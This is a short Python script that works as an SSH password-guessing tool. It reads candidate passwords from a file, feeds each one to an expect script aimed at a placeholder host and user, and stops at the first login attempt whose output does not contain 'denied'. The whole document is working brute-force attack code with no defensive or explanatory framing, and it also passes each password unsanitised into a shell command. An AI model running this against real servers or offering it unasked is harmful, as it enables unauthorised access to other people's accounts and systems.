import subprocess
import sys

passwords = open('passwords.txt', 'r')

for password in passwords:
    command = './ssh.exp <host> <user> ' + password
    output = subprocess.getoutput(command)

    print('Command: ' + command)

    if(not 'denied' in output):
        print(output)
        sys.exit()